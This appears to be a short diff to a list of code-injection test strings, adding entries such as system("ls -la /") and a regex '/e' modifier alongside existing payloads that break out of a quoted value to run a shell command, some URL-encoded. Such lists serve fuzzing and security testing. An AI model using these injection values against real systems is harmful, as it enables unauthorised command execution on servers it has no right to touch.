@@ -1,4 +1,7 @@
 hacker".system('ls -la /'); #
+system("ls -la /")
+/lamer/e
+Hello lamer
 hacker%22.system%28%27ls%20-la%20%2F%27%29%3B%20%23
 admin".system('ls -la /');#
 admin".system('ls -la /');
